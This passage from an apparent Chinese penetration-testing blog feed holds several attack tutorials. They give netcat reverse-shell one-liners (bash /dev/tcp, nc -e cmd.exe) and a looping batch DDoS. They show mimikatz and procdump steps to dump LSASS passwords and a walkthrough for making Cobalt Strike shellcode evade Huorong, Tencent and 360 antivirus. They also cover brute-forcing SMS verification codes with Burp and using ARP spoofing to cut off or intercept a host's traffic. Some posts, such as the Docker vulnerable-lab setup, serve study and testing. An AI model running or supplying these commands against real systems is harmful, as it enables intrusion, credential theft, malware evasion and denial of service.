-z 192.168.199.111 3385-3399 <br><br><span class="hljs-comment"># Windows反弹shell</span><br>nc.exe -lvp 8888                        <span class="hljs-comment"># 监听端口</span><br>nc.exe -t -e cmd.exe 192.168.199.152 8888  <span class="hljs-comment"># 反弹shell</span><br><br><span class="hljs-comment"># Linux反弹shell</span><br>nc -lvp 8888                           <span class="hljs-comment"># 监听端口</span><br>bash -i &gt;&amp; /dev/tcp/192.168.199.111/8888 0&gt;&amp;1  <span class="hljs-comment"># 反弹shell</span><br></code></pre></td></tr></table></figure><hr><h4 id="🚀-2、进阶用法"><a href="#🚀-2、进阶用法" class="headerlink" title="🚀 2、进阶用法"></a>🚀 2、进阶用法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 做蜜罐，持续监听3389端口，将接收到的数据保存到c:\log.txt</span><br>nc -L -p 3389 &gt; c:\log.txt<br><br><span class="hljs-comment"># 监听3389端口，并把payload.txt文件内容发送给连接者（传输文件）</span><br>nc -L -p 3389 &lt; c:\payload.txt<br><br><span class="hljs-comment"># 绑定Windows主机cmd到8888端口，使用Telnet交互</span><br>nc -l -p 8888 -t -e cmd.exe<br><br><span class="hljs-comment"># 绑定cmd反向连接到远程主机192.168.199.111的888端口，Telnet交互</span><br>nc -t -e cmd.exe 192.168.199.111 888<br><br><span class="hljs-comment"># 上传ASP木马到目标服务器80端口</span><br>nc -vv www.xx.com 80 &lt; xx.asp<br><br><span class="hljs-comment"># 发送本地1.txt文件内容到192.168.199.111的80端口</span><br>nc -nvv 192.168.199.111 80 &lt; 1.txt<br><br><span class="hljs-comment"># 架设简单的HTTP服务器，监听80端口，页面内容为index.html</span><br>nc -l -p 80 &lt; index.html<br><br><span class="hljs-comment"># 利用nc进行简单的DDOS攻击（发送垃圾数据）</span><br>nc -vv www.xxx.com 80 &lt; 1.txt<br><br><span class="hljs-comment"># 批处理循环DDOS攻击示例</span><br>@<span class="hljs-built_in">echo</span> off  <br>color a  <br>:1  <br>cls  <br>nc -vv www.xxx.com 80 &lt; 1.txt  <br>goto 1 <br></code></pre></td></tr></table></figure><hr><h4 id="💡-小贴士"><a href="#💡-小贴士" class="headerlink" title="💡 小贴士"></a>💡 小贴士</h4><ul><li>Windows和Linux编码不同，出现乱码时可用<code>chcp 65001</code>切换到UTF-8编码。</li><li>简单的HTTP服务器只能单页服务，无法处理多用户并发，适合局域网测试或ARP欺骗挂马。</li><li>使用<code>-e</code>参数反弹shell非常危险，慎用！</li></ul><hr><h4 id="📷-演示截图"><a href="#📷-演示截图" class="headerlink" title="📷 演示截图"></a>📷 演示截图</h4><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/20191118202760.png" alt="nc命令示例"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191118214242-1719818490555-1.png" alt="Windows下nc使用"></p>]]></content>
    
    
    
    <tags>
      
      <tag>反弹shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用 mimikatz 获取明文密码</title>
    <link href="/2024/07/01/%E5%88%A9%E7%94%A8%20mimikatz%20%E8%8E%B7%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81/"/>
    <url>/2024/07/01/%E5%88%A9%E7%94%A8%20mimikatz%20%E8%8E%B7%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="📌-0、简介"><a href="#📌-0、简介" class="headerlink" title="📌 0、简介"></a>📌 0、简介</h2><p><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a> 可以从 Windows 内存中获取账户明文密码、哈希、PIN、票据等敏感信息。</p><p>下载地址：<br>👉 <a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200308-1">mimikatz 2.2.0-20200308-1</a></p><hr><h2 id="📌-1、常用命令"><a href="#📌-1、常用命令" class="headerlink" title="📌 1、常用命令"></a>📌 1、常用命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 开始记录日志</span><br><span class="hljs-built_in">log</span><br><br><span class="hljs-comment"># 获取调试权限（必须）</span><br>privilege::debug<br><br><span class="hljs-comment"># 列出当前登录用户凭据</span><br>sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><hr><h2 id="📌-2、保存内存转储"><a href="#📌-2、保存内存转储" class="headerlink" title="📌 2、保存内存转储"></a>📌 2、保存内存转储</h2><p>Windows 的 LSASS（Local Security Authority Subsystem Service）进程保存了用户凭据，可使用微软官方的 procdump 转储内存：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 procdump64.exe 导出 lsass 内存（需管理员权限）</span><br>procdump64.exe -accepteula -ma lsass.exe lsass.dmp<br></code></pre></td></tr></table></figure><hr><h2 id="📌-3、离线读取转储文件"><a href="#📌-3、离线读取转储文件" class="headerlink" title="📌 3、离线读取转储文件"></a>📌 3、离线读取转储文件</h2><p>把 <code>lsass.dmp</code> 下载到本地后，使用 mimikatz 读取：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 指定转储文件</span><br>sekurlsa::minidump lsass.dmp<br><br><span class="hljs-comment"># 启用日志（可选）</span><br><span class="hljs-built_in">log</span><br><br><span class="hljs-comment"># 列出凭据</span><br>sekurlsa::logonpasswords full<br></code></pre></td></tr></table></figure><hr><h2 id="⚠️-注意"><a href="#⚠️-注意" class="headerlink" title="⚠️ 注意"></a>⚠️ 注意</h2><p>✅ 建议使用管理员权限执行<br>✅ 转储文件中包含明文密码，请妥善保管<br>✅ <code>procdump</code> 是 Sysinternals 官方工具，大部分杀软不会阻止</p>]]></content>
    
    
    
    <tags>
      
      <tag>明文密码</tag>
      
      <tag>mimikatz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用 docker 搭建漏洞复测环境</title>
    <link href="/2024/07/01/%E4%BD%BF%E7%94%A8%20docker%20%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E6%B5%8B%E7%8E%AF%E5%A2%83/"/>
    <url>/2024/07/01/%E4%BD%BF%E7%94%A8%20docker%20%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E6%B5%8B%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<h4 id="0、简介"><a href="#0、简介" class="headerlink" title="0、简介"></a>0、简介</h4><p>使用docker可以下载公开的漏洞镜像，从而简单的搭建漏洞复测环境。</p><h4 id="1、演示-s2-048"><a href="#1、演示-s2-048" class="headerlink" title="1、演示(s2-048)"></a>1、演示(s2-048)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 搜索struts2镜像</span><br>docker search struts2<br><span class="hljs-comment"># 下载s2-048&lt;CVE-2017-9791&gt;镜像</span><br>docker pull vulfocus/struts2-cve_2017_9791<br><span class="hljs-comment"># 查看镜像的详细信息，可以看到镜像运行的端口等信息</span><br>docker inspect vulfocus/struts2-cve_2017_9791<br><span class="hljs-comment"># 启动S2-048漏洞镜像:-d:后台运行 -p：映射端口 这里将8080映射为8081</span><br>docker run -d -p 8081:8080 vulfocus/struts2-cve_2017_9791<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-1.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-2.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-3.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-4-1024x511.png" alt="img"></p>]]></content>
    
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dirsearch 网站目录扫描工具的使用方法</title>
    <link href="/2024/07/01/dirsearch%20%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <url>/2024/07/01/dirsearch%20%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h3 id="1、常用"><a href="#1、常用" class="headerlink" title="1、常用"></a>1、常用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 扫描单个目标</span><br>python dirsearch.py -u https://target -r -x 400,500-599<br><span class="hljs-comment"># 扫描多个目标</span><br>python dirsearch.py -l url.txt -r -x 400,500-599 -w web_dirs_ext.txt <br><span class="hljs-comment"># 扩展后缀名[php,jsp]</span><br>python dirsearch.py -e php,jsp,html -u https://target<br><span class="hljs-comment"># 扫描备份文件 -t 20线程</span><br>python dirsearch.py -e bak,zip,tgz -u https://target -t 20<br><span class="hljs-comment"># 使用代理</span><br>python dirsearch.py -u https://target --proxy 127.0.0.1:8081<br></code></pre></td></tr></table></figure><h3 id="2、扩展"><a href="#2、扩展" class="headerlink" title="2、扩展"></a>2、扩展</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># -e php,jsp| 字典：index.%EXT%| 需要%EXT%</span><br>index<br>index.php<br>index.jsp<br><br><span class="hljs-comment"># -f php,jsp| 字典：admin| 不需要%EXT%，强制扩展后缀名</span><br>admin<br>admin.php<br>admin.html<br>admin/<br><br><span class="hljs-comment"># -O php,jsp| 字典：login.html| 覆盖原本扩展名</span><br>login.html<br>login.jsp<br>login.jspa<br><br><span class="hljs-comment"># -X 排除扩展名 字典：admin.php test.jsp | 结果：admin.php</span><br>python dirsearch.py -u https://target -X jsp<br></code></pre></td></tr></table></figure><h3 id="3、递归"><a href="#3、递归" class="headerlink" title="3、递归"></a>3、递归</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 递归暴力破解是在找到目录之后不断地进行暴力破解。例如，如果 dirsearch 找到admin/，它将暴力破解admin/（这是暴力破解的地方）。要启用此功能，请使用-r</span><br>python dirsearch.py -e php -u https://target -r<br><br><span class="hljs-comment"># 使用--max-recursion- depth 设置最大递归深度，并使用--recursion-status设置递归状态代码</span><br>python dirsearch.py -e php -u https://target -r --max-recursion-depth 3 --recursion-status 200-399<br><br><span class="hljs-comment"># ● 还有 2 个选项：--force-recursive和--deep-recursive </span><br><span class="hljs-comment"># ○ 强制递归：蛮力递归地强制所有找到的路径，而不仅仅是路径以/</span><br><span class="hljs-comment"># ○ 深度递归：递归暴力破解路径的所有深度（a/b/c=&gt; 添加a/，a/b/）</span><br><span class="hljs-comment"># ● 如果有您不想递归暴力破解的子目录，请使用--exclude-subdirs</span><br>python dirsearch.py -e php,html,js -u https://target -r --exclude-subdirs image/,css/<br></code></pre></td></tr></table></figure><h3 id="4、前缀-后缀"><a href="#4、前缀-后缀" class="headerlink" title="4、前缀&#x2F;后缀"></a>4、前缀&#x2F;后缀</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># -prefixes：为所有条目添加自定义前缀</span><br>python dirsearch.py -u https://target --prefixes .,admin,_<br>    <br><span class="hljs-comment"># 字典：tools| 结果：</span><br>tools<br>.tools<br>admintools<br>_tools<br><br><span class="hljs-comment"># --suffixes : 为所有条目添加自定义后缀</span><br>python dirsearch.py -u https://target --suffixes ~,_admin<br>    <br><span class="hljs-comment"># 字典：index.php | 结果：</span><br>index.php<br>index.php~<br>index.php_admin<br></code></pre></td></tr></table></figure><h3 id="5、过滤器"><a href="#5、过滤器" class="headerlink" title="5、过滤器"></a>5、过滤器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用-i  --include-status | -x  --exclude-status选择允许和不允许的响应状态代码</span><br>python dirsearch.py -u https://target -i 200<br>python dirsearch.py -u https://target -x 400,500-599<br><br><span class="hljs-comment"># 高级的过滤器：--exclude-sizes、--exclude-texts、--exclude-regexps、--exclude-redirects和--exclude-response</span><br>python dirsearch.py -u https://target --exclude-sizes 1B,243KB<br>python dirsearch.py -u https://target --exclude-texts <span class="hljs-string">&quot;403 Forbidden&quot;</span><br>python dirsearch.py -u https://target --exclude-regexps <span class="hljs-string">&quot;^Error$&quot;</span><br>python dirsearch.py -u https://target --exclude-redirects <span class="hljs-string">&quot;https://(.*).okta.com/*&quot;</span><br>python dirsearch.py -u https://target --exclude-response /error.html<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>扫描工具</tag>
      
      <tag>目录扫描</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cobalt strike免杀火绒和管家</title>
    <link href="/2024/07/01/cobalt%20strike%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92%E5%92%8C%E7%AE%A1%E5%AE%B6/"/>
    <url>/2024/07/01/cobalt%20strike%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92%E5%92%8C%E7%AE%A1%E5%AE%B6/</url>
    
    <content type="html"><![CDATA[<h4 id="0、简介-🚀"><a href="#0、简介-🚀" class="headerlink" title="0、简介 🚀"></a>0、简介 🚀</h4><p>CS生成C格式的shellcode：</p><blockquote><p>Attacks ——&gt; packages ——&gt; Payload Generator，选择一个listener生成payload.c。</p></blockquote><h4 id="1、CS-Avoid-killing-🖼️"><a href="#1、CS-Avoid-killing-🖼️" class="headerlink" title="1、CS-Avoid-killing 🖼️"></a>1、CS-Avoid-killing 🖼️</h4><p>工具地址：<a href="https://github.com/Gality369/CS-Loader">Gality369&#x2F;CS-Loader: CS免杀 (github.com)</a></p><p>将图片放入同一文件夹，将shellcode填入<code>generator.py</code>：</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-1.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-2-1024x402.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 生成的shellcode会自动追加到图片末尾</span><br>python2 generator.py YourRC4key ImageName<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-3.png" alt="img"></p><p>将生成的shellcode图片上传至<a href="https://imgtp.com/">ImgTP</a>（选择无压缩的图床，保证shellcode不被删减）。然后在<code>CS-Loader.go</code>中填入你的图片URL和RC4key。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 编译</span><br>go build -ldflags=<span class="hljs-string">&quot;-H windowsgui&quot;</span> CS-Loader.go<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-4-1024x541.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-5.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-6.png" alt="img"></p><h5 id="火绒检测效果-🔥"><a href="#火绒检测效果-🔥" class="headerlink" title="火绒检测效果 🔥"></a>火绒检测效果 🔥</h5><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-7-1024x491.png" alt="img"></p><h5 id="腾讯电脑管家检测效果-🛡️"><a href="#腾讯电脑管家检测效果-🛡️" class="headerlink" title="腾讯电脑管家检测效果 🛡️"></a>腾讯电脑管家检测效果 🛡️</h5><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-8-1024x489.png" alt="img"></p><h4 id="2、bypassAV-🛠️"><a href="#2、bypassAV-🛠️" class="headerlink" title="2、bypassAV 🛠️"></a>2、bypassAV 🛠️</h4><p>工具地址：<a href="https://github.com/pureqh/bypassAV">pureqh&#x2F;bypassAV: 免杀shellcode加载器 (github.com)</a></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-9.png" alt="img"></p><p>使用步骤：</p><ol><li>将shellcode填入<code>go_shellcode_encode.py</code>生成混淆后的base64 payload</li><li>将生成的base64 payload填入<code>main.go</code>的<code>build(&quot;shellcode&quot;)</code></li><li>替换<code>main.go</code>中的url为可正常访问网页</li><li>编译：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">go build -trimpath -ldflags=<span class="hljs-string">&quot;-w -s -H=windowsgui&quot;</span> main.go<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-10-1024x540.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-11-1024x534.png" alt="img"></p><h5 id="火绒检测效果-🔥-1"><a href="#火绒检测效果-🔥-1" class="headerlink" title="火绒检测效果 🔥"></a>火绒检测效果 🔥</h5><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-12-1024x517.png" alt="img"></p><h5 id="腾讯电脑管家检测效果-🛡️-1"><a href="#腾讯电脑管家检测效果-🛡️-1" class="headerlink" title="腾讯电脑管家检测效果 🛡️"></a>腾讯电脑管家检测效果 🛡️</h5><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-13-1024x518.png" alt="img"></p>]]></content>
    
    
    
    <tags>
      
      <tag>免杀</tag>
      
      <tag>cobalt strike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cobalt strike免杀360</title>
    <link href="/2024/07/01/cobalt%20strike%E5%85%8D%E6%9D%80360/"/>
    <url>/2024/07/01/cobalt%20strike%E5%85%8D%E6%9D%80360/</url>
    
    <content type="html"><![CDATA[<h2 id="0、简介-🛡️"><a href="#0、简介-🛡️" class="headerlink" title="0、简介 🛡️"></a>0、简介 🛡️</h2><p>CS 生成 Raw 格式的 shellcode：</p><blockquote><p>Attacks ——&gt; packages ——&gt; Payload Generator，选择一个 listener，生成 payload.bin。</p></blockquote><h2 id="1、ThreadStackSpoofer-加载器-🧠"><a href="#1、ThreadStackSpoofer-加载器-🧠" class="headerlink" title="1、ThreadStackSpoofer 加载器 🧠"></a>1、ThreadStackSpoofer 加载器 🧠</h2><p>ThreadStackSpoofer 加载器通过堆栈欺骗技术实现免杀。</p><p>工具地址：<a href="https://github.com/mgeeky">mgeeky</a> &#x2F; <strong><a href="https://github.com/mgeeky/ThreadStackSpoofer">ThreadStackSpoofer</a></strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">Usage: C:\&gt; ThreadStackSpoofer.exe &lt;shellcode&gt; &lt;spoof&gt;<br>[.] Reading shellcode bytes...<br>[.] Hooking kernel32!Sleep...<br>[.] Injecting shellcode...<br>[+] Shellcode is now running.<br>[&gt;] Original <span class="hljs-built_in">return</span> address: 0x1926747bd51. Finishing call stack...<br><br>===&gt; MySleep(5000)<br><br>[&lt;] Restoring original <span class="hljs-built_in">return</span> address...<br>[&gt;] Original <span class="hljs-built_in">return</span> address: 0x1926747bd51. Finishing call stack...<br><br>===&gt; MySleep(5000)<br><br>[&lt;] Restoring original <span class="hljs-built_in">return</span> address...<br>[&gt;] Original <span class="hljs-built_in">return</span> address: 0x1926747bd51. Finishing call stack...<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-2.png" alt="image-2"></p><h2 id="2、ShellcodeFluctuation-加载器-🔄"><a href="#2、ShellcodeFluctuation-加载器-🔄" class="headerlink" title="2、ShellcodeFluctuation 加载器 🔄"></a>2、ShellcodeFluctuation 加载器 🔄</h2><p>ShellcodeFluctuation 加载器通过循环加密和解密 shellcode 的内容实现免杀。</p><p>工具地址：<a href="https://github.com/mgeeky">mgeeky</a> &#x2F; <strong><a href="https://github.com/mgeeky/ShellcodeFluctuation">ShellcodeFluctuation</a></strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Usage: C:\&gt; ShellcodeFluctuation.exe &lt;shellcode&gt; &lt;fluctuate&gt;<br>&lt;fluctuate&gt;:<br>       -1 - 读取 shellcode，但不注入，运行无限循环。<br>        0 - 注入 shellcode，但不 hook kernel32!Sleep，也不加密。<br>        1 - 注入 shellcode，使用标准 PAGE_READWRITE 开始波动其内存。<br>        2 - 注入 shellcode，使用 ORCA666 的 PAGE_NOACCESS 开始波动其内存。<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/16395482821-1024x486.png" alt="img"></p>]]></content>
    
    
    
    <tags>
      
      <tag>免杀</tag>
      
      <tag>cobalt strike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用 burp 随机枚举验证码或手机号</title>
    <link href="/2024/07/01/%E4%BD%BF%E7%94%A8%20burp%20%E9%9A%8F%E6%9C%BA%E6%9E%9A%E4%B8%BE%E9%AA%8C%E8%AF%81%E7%A0%81%E6%88%96%E6%89%8B%E6%9C%BA%E5%8F%B7/"/>
    <url>/2024/07/01/%E4%BD%BF%E7%94%A8%20burp%20%E9%9A%8F%E6%9C%BA%E6%9E%9A%E4%B8%BE%E9%AA%8C%E8%AF%81%E7%A0%81%E6%88%96%E6%89%8B%E6%9C%BA%E5%8F%B7/</url>
    
    <content type="html"><![CDATA[<h4 id="0、简介"><a href="#0、简介" class="headerlink" title="0、简介"></a>0、简介</h4><p>利用 Burp Suite 的 Intruder 模块对手机号、4位数或6位数验证码进行随机枚举，模拟爆破尝试。</p><hr><h4 id="1、操作流程"><a href="#1、操作流程" class="headerlink" title="1、操作流程"></a>1、操作流程</h4><ul><li>在 Intruder 的 Payloads 选项卡中，设置 <strong>Payload type</strong> 为 <strong>Numbers</strong>。</li><li>选择 <strong>Random</strong>，表示随机生成数字。</li><li>设置 <strong>How many</strong> 为爆破的总次数（即生成多少随机数字）。</li><li>设置 <strong>Min integer digits</strong> 和 <strong>Max integer digits</strong>，分别表示数字的最小和最大长度，比如4位验证码就都填4。</li></ul><hr><h4 id="2、参数示例说明"><a href="#2、参数示例说明" class="headerlink" title="2、参数示例说明"></a>2、参数示例说明</h4><table><thead><tr><th>参数</th><th>含义</th><th>说明</th></tr></thead><tbody><tr><td>Payload type</td><td>数字类型</td><td>选择 Numbers</td></tr><tr><td>Random</td><td>随机生成</td><td>生成随机数字</td></tr><tr><td>How many</td><td>生成数量</td><td>枚举总次数</td></tr><tr><td>Min integer digits</td><td>最小位数</td><td>如4位验证码填4</td></tr><tr><td>Max integer digits</td><td>最大位数</td><td>一般与最小位数相同</td></tr></tbody></table><hr><h4 id="3、界面示例"><a href="#3、界面示例" class="headerlink" title="3、界面示例"></a>3、界面示例</h4><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20241217164935896.png" alt="验证码随机枚举设置"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20241217165953828.png" alt="验证码爆破执行效果"></p><hr><p>这样即可方便地使用 Burp 的 Intruder 模块针对验证码或手机号进行随机数字爆破测试。</p>]]></content>
    
    
    
    <tags>
      
      <tag>burp</tag>
      
      <tag>验证码</tag>
      
      <tag>随机枚举</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kali中间人攻击 — ARP欺骗详解</title>
    <link href="/2024/07/01/Kali%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%20%E2%80%94%20ARP%E6%AC%BA%E9%AA%97%E8%AF%A6%E8%A7%A3/"/>
    <url>/2024/07/01/Kali%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%20%E2%80%94%20ARP%E6%AC%BA%E9%AA%97%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h2 id="0、简介"><a href="#0、简介" class="headerlink" title="0、简介"></a>0、简介</h2><p>ARP攻击，又称为中间人攻击（Man-in-the-Middle，MITM），是局域网中常见的一种攻击手法。攻击者通过伪造ARP响应包，将自己的MAC地址欺骗成网关或目标主机的MAC地址，从而截获、篡改甚至中断网络流量，实现对通信内容的监听和控制。</p><p>这种攻击威力强大且隐蔽，常用于网络钓鱼、数据窃取以及会话劫持等攻击场景，是网络安全防御中不可忽视的风险。</p><hr><h2 id="1、断网攻击"><a href="#1、断网攻击" class="headerlink" title="1、断网攻击"></a>1、断网攻击</h2><p>断网攻击是利用ARP欺骗的手段，强制目标主机与网络断开连接。当攻击结束后，目标网络即可自动恢复。</p><h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><ol><li><strong>探测局域网存活主机</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fping -a -g 192.168.118.1/24<br></code></pre></td></tr></table></figure><p>该命令扫描指定网段内的所有活跃IP，列出存活的设备，方便后续定位攻击目标。</p><ol start="2"><li><strong>对目标主机进行断网攻击</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">arpspoof -i eth0 -t 192.168.118.138 192.168.118.2<br></code></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>-i eth0</code>：指定网卡接口。</li><li><code>-t 192.168.118.138</code>：目标主机IP。</li><li><code>192.168.118.2</code>：网关IP。</li></ul><p>该命令将目标主机的ARP缓存欺骗成攻击者的MAC地址，导致目标主机无法正常访问网络，实现断网效果。</p><hr><h2 id="2、ARP欺骗实现中间人攻击"><a href="#2、ARP欺骗实现中间人攻击" class="headerlink" 